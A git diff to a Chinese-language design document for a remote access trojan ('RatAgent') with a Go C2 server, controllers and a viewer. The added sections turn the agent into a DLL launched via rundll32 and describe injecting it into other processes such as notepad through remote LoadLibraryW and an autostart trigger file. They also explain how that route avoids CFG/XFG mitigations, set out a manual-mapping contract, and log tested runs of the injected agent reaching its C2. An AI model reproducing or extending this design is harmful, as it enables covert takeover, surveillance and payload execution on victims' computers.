@@ -10,14 +10,15 @@
 三端、三条信道：
 
 ```
-┌─ RatAgent.exe (C++) ────────────────────────────────┐
-│  默认入口：长连接模式（TCP 4444）                     │
+┌─ RatAgent.exe / RatAgent.dll (C++) ─────────────────┐
+│  同一套 core，两种产物；默认 beacon，-tcp 切长连接     │
+│  ├ agent_runtime（共用运行核心：启停/路径/停止事件）    │
 │  ├ net / protocol / crypto / session                │
 │  ├ cmd_dispatch（命令分发中心：SYS_INFO/EXEC_PS/...） │
 │  ├ screen_spy（GDI 抓屏）                            │
 │  ├ screen_stream（屏幕流长连接线程 + 输入注入）        │
 │  ├ input_replay / desktop_switch（SendInput 注入）    │
-│  └ beacon（HTTP 轮询备选入口，可切换）                 │
+│  └ beacon（HTTP 轮询）/ main(EXE 入口) / agent_dll(DLL 导出) │
 └──────────┬──────────────────────┬──────────────────┘
            │ TCP 4444 (ctl 信道)   │ TCP 4445 (屏幕流信道)
            ▼                      ▼
@@ -38,7 +39,7 @@
 
 | 端 | 语言 | 默认信道 | 角色 |
 |---|---|---|---|
-| RatAgent | C++ (Windows) | TCP 4444 长连接（`run_agent`）；beacon HTTP 8080 备选（`run_beacon`） | 被控端：抓屏/执行命令/注入输入/落盘执行 payload |
+| RatAgent | C++ (Windows) | beacon HTTP 8080（`-tcp` 切 TCP 4444 长连接）；EXE/DLL 两种产物 | 被控端：抓屏/执行命令/注入输入/落盘执行 payload |
 | c2server | Go | 监听 4444/8080/4445 | C2 中枢：会话/中继/转发 |
 | ratctl | Go | TCP 4444 | 控制端（CLI）：会话/系统/截屏/拉起 viewer/payload |
 | im_ctl | C++ (ImGui) | TCP 4444 | 控制端（GUI） |
@@ -147,13 +148,38 @@
 
 | 模块 | 职责 |
 |---|---|
-| `main.cpp` | 默认入口 `run_agent`（TCP 4444 长连接：握手/心跳/读包分发）；`run_beacon`（HTTP 轮询备选）；`agent.id` 持久化 |
-| `session` | 握手、心跳线程（15s，seq 递增） |
+| `agent_runtime` | **EXE/DLL 共用的运行核心**：参数解析（空格/逗号分隔，兼容 rundll32）、启动/停止/状态、`agent.id` 与日志路径解析、可停止的睡眠、活动 socket 注册（stop 时 `shutdown` 打断阻塞读）、跨进程停止命名事件、注入自启动触发器 |
+| `main.cpp` | EXE 入口（薄壳）：解析 argv → `agent_start` → `agent_wait(-1)`；支持 `-tcp`（长连接）与 `--selftest` |
+| `agent_dll.cpp` | DLL 入口：rundll32 导出 `Start`/`Stop`（`Start` 阻塞驻留）、加载器/注入导出 `StartAgent`/`StopAgent`/`StopAgentEx`/`AgentRunning`/`AgentVersion`/`AgentMode`/`AgentPing`/`AgentBootstrap`；`DllMain` 只做触发器探测与停止标志（不在 loader lock 下做重活） |
+| `session` | 握手、心跳线程（15s，seq 递增，分片睡眠可被停止唤醒） |
 | `cmd_dispatch` | 命令分发中心：SysInfo（RtlGetVersion/GlobalMemoryStatusEx/GetDiskFreeSpaceEx）、ExecPs（CreateProcess powershell + 管道捕获 + 120s 超时）、ScreenStream 控制、Screenshot（GDI 抓帧 + WIC JPEG）、Payload（分块落盘 `%TEMP%\c2_payload\` + CreateProcess 执行） |
 | `screen_spy` | GDI 抓屏（虚拟屏幕/DPI/区域/全分辨率） |
 | `screen_stream` | 4445 连接线程：握手 → 帧循环（抓屏+WIC JPEG+加密上行，节奏由 `fps` 时间片控制、质量由 `quality` 经 WIC 属性包设置）+ 输入接收（自持重装缓冲 `InputStream` + `SendInput` 注入）；start/stop 线程状态机（`g_thread_alive` + `ThreadGuard`，可自愈重启） |
 | `input_replay`/`desktop_switch` | 注入实现（WM_* 映射、坐标换算、活动桌面切换） |
-| `beacon` | HTTP 轮询（GET 命令/POST 结果/TLV/jitter） |
+| `beacon` | HTTP 轮询（GET 命令/POST 结果/TLV/jitter，可被停止标志唤醒） |
+
+#### 4.2.1 两种产物形态（同一套 core 源码）
+
+| 形态 | 工程 | 入口 | 适用场景 | 身份/日志 |
+|---|---|---|---|---|
+| `RatAgent.exe` | `RatAgent.vcxproj` | `main()` | 独立进程部署、调试 | CWD 下 `agent.id`；stdout |
+| `RatAgent.dll` | `RatAgentDll.vcxproj` | 导出函数 + `DllMain` | rundll32 / 宿主 LoadLibrary / 注入 | `%LOCALAPPDATA%\RatAgent\agent.id` + `agent.log`（`id=`/`log=` 可覆盖） |
+
+DLL 侧关键设计（三处踩坑点）：
+
+1. **rundll32 的 `Start` 必须阻塞驻留**：入口点一返回 rundll32 就会结束进程，所以 `Start`
+   启动后 `agent_wait(-1)`；而给加载器/注入器用的 `StartAgent` 是非阻塞的。
+2. **跨进程停止**：进程内标志 + 每个实例的命名事件 `Local\RatAgentStop.<agent_id_hex>`；
+   `Stop`（可在另一个进程里）从 `id` 文件或 32 位 hex 推出事件名并 `SetEvent`，
+   被停实例的循环/睡眠/阻塞读都会被唤醒并优雅退出（host 进程不受影响）。
+3. **注入路径避开 CFG/XFG**：现代 Windows 目标会拦住"远程线程入口指向镜像内任意导出"
+   （`0xC0000409`/`__fastfail`，实测连零依赖的探针导出也一样），但远程 `LoadLibraryW` 可用；
+   因此采用**触发器自启动**：注入方先写 `%LOCALAPPDATA%\RatAgent\autostart.args`（或 `%TEMP%\RatAgent\autostart.args`），
+   再远程 `LoadLibraryW`，`DllMain` 检测到触发器后交给 `_beginthreadex` 建的新线程去解析并启动。
+
+**手动映射契约**：DLL 用静态 CRT（`/MT`，实测依赖项只有系统 DLL，无 VC 运行库）；
+映射方**必须先调用入口点**（`DllMainCRTStartup`，`DLL_PROCESS_ATTACH`）让 CRT 初始化；
+代码不依赖 `GetModuleFileName`/CWD/TLS，导出内不抛异常。
 
 ### 4.3 控制端
 
@@ -236,7 +262,7 @@ c2/
 ├── internal/protocol/ # Go 协议层（编解码/AES-GCM/HKDF/测试向量）
 ├── server/            # Go c2server + session
 ├── ctl/cmd/ratctl/    # Go 交互式 shell
-├── client/core/       # C++ Agent 全部模块
+├── client/core/       # C++ Agent 全部模块（EXE 与 DLL 共用：agent_runtime/agent_dll/main）
 ├── im_ctl/            # C++ ImGui 控制端（external: imgui/glad/glfw）
 ├── viewer/            # C++ Win32 远控查看器（独立 CMake 工程）
 └── scripts/           # e2e_m1~m4（m4 为屏幕流验收）+ ctl_stream_probe
@@ -248,8 +274,10 @@ GO="C:/Users/202603/.g/go/bin/go.exe"
 "$GO" build -o bin/c2server.exe ./server/cmd/c2server
 "$GO" build -o bin/ratctl.exe ./ctl/cmd/ratctl
 "$GO" build -o bin/ctl_stream_probe.exe ./scripts/ctl_stream_probe
-# Agent（MSBuild）+ im_ctl（CMake）
-MSBUILD ... client/RatAgent.vcxproj -p:Configuration=Debug -p:Platform=x64
+# Agent：EXE 与 DLL 两个工程（共享同一批 core 源码）
+MSBUILD ... client/RatAgent.vcxproj    -p:Configuration=Debug -p:Platform=x64   # RatAgent.exe
+MSBUILD ... client/RatAgentDll.vcxproj -p:Configuration=Debug -p:Platform=x64   # RatAgent.dll（/MT）
+# im_ctl（CMake）
 cmake --build im_ctl/build --config Debug
 # viewer（CMake，独立工程；输出 <build>/bin/viewer.exe）
 cmake -S viewer -B viewer/build && cmake --build viewer/build --config Debug
@@ -272,7 +300,7 @@ python scripts/e2e_m4.py   # 屏幕流全链路（长连接 agent + probe：帧 
 python scripts/e2e_m3.py   # beacon 轮询 + 交互式 ratctl
 ```
 
-### 8.1 本轮人工端到端验证记录（beacon agent + ratctl + viewer）
+### 8.1 人工端到端验证记录（beacon agent + ratctl + viewer）
 
 环境：`c2server.exe` + `RatAgent.exe 127.0.0.1 8080 -s 5`（beacon 信道）+ `ratctl`（脚本化 stdin）。
 
@@ -288,6 +316,24 @@ python scripts/e2e_m3.py   # beacon 轮询 + 交互式 ratctl
 | 兜底停流 | `stop` | ✅ `screen stream stopped` → agent 断开 4445 |
 | 踢下线 | `kill <id>` | ✅ 返回 OK（beacon 会话无 TCP 可关，见 §9） |
 
+### 8.2 Agent 双产物（EXE/DLL）验证记录
+
+| 场景 | 做法 | 结果 |
+|---|---|---|
+| 导出表 | `dumpbin /exports RatAgent.dll` | ✅ `Start/Stop/StartAgent/StopAgent/StopAgentEx/AgentRunning/AgentVersion/AgentMode/AgentPing/AgentBootstrap`（x64 无修饰） |
+| 注入安全性 | `dumpbin /dependents` | ✅ 只依赖系统 DLL（WS2_32/bcrypt/WINHTTP/dxgi/KERNEL32/USER32/GDI32/ADVAPI32/ole32/OLEAUT32），**无 VC 运行库 DLL**（静态 CRT /MT） |
+| rundll32 启动 | `rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5,id=…,log=…` | ✅ 日志落盘 + beacon 上线 + 进程驻留 >20s（`Start` 阻塞语义正确） |
+| 跨进程停止 | 另一进程 `rundll32 RatAgent.dll,Stop id=<id 文件>` | ✅ `stop by id file … -> signalled` → 目标实例 `[beacon] stopped` → 入口点返回、进程退出 |
+| LoadLibrary 宿主 | 测试宿主 `LoadLibraryW` → `StartAgent` → `StopAgent` → `FreeLibrary` | ✅ 上线 → 优雅停止（`running=0`）→ 卸载无异常 |
+| 注入（远程加载 + 触发器） | 写 `%TEMP%\RatAgent\autostart.args` → 远程 `LoadLibraryW` 到 notepad | ✅ agent 在 **notepad 进程内**运行并上线；跨进程 Stop 生效后**宿主进程存活** |
+| exe 回归 | beacon `RatAgent.exe 127.0.0.1 8080 -s 5` | ✅ 稳定 id `e88f08ae…`、beacon-agent 上线 |
+| exe 新 `-tcp` | `RatAgent.exe 127.0.0.1 4444 -tcp` | ✅ `[+] connected, session key derived`；sessions 显示真实 `127.0.0.1:58484` 与 `os=Windows`，与 beacon 会话并存 |
+| 构建配置 | DLL Debug 与 Release | ✅ 两者均生成（两者都静态 CRT /MT） |
+
+> 反面证据（重要）：把远程线程入口直接指向 DLL 导出（即使是零 CRT 依赖的 `AgentPing`）
+> 在 Win11 目标里返回 `0xC0000409`（`__fastfail`）——目标进程的 CFG/XFG 缓解所致；
+> 远程 `LoadLibraryW`（kernel32 地址）则正常。故注入路径采用"远程加载 + 触发器自启动"。
+
 ## 9. 已知限制与待办
 
 - im_ctl 输入回放需 GUI 手动端到端确认
@@ -301,6 +347,13 @@ python scripts/e2e_m3.py   # beacon 轮询 + 交互式 ratctl
 - **viewer 输入策略**：鼠标仅图像矩形内下发，键盘仅 viewer 为前台窗口时下发；
   本机注入事件被 `LL*HF_INJECTED` 过滤，不会回环
 - 正式化：PSK 外部化、多显示器/区域抓屏配置、屏幕流码率自适应
+- **注入方式限制**：现代 Windows 目标的 CFG/XFG 会拦住"远程线程入口指向镜像内导出"
+  （`0xC0000409`）；请用"远程 `LoadLibraryW` + `autostart.args` 触发器"，或手动映射
+  （须先调用入口点，见 §4.2.1）
+- **注入自启动触发器需人工清理**：`%LOCALAPPDATA%\RatAgent\autostart.args`（或 `%TEMP%` 下同名）
+  存在即自启动，删除该文件才会关闭；DLL 不自动删（避免误删）
+- **DLL 形态默认落盘位置**：`%LOCALAPPDATA%\RatAgent\`（`agent.id` / `agent.log`），
+  可用 `id=`/`log=` 覆盖；EXE 形态仍用 CWD 下的 `agent.id`（保持历史行为）
 - **信道语义**：未知指令两信道一致（都回 `CMD_RESULT(status=1)`）；
   beacon 结果块允许零长度结果（`decodeResults` 用 `io.ReadFull`，`ln==0` 不读）
 - `im_ctl/external/imgui` 为内嵌 git 仓库（gitlink），clone 需单独处理
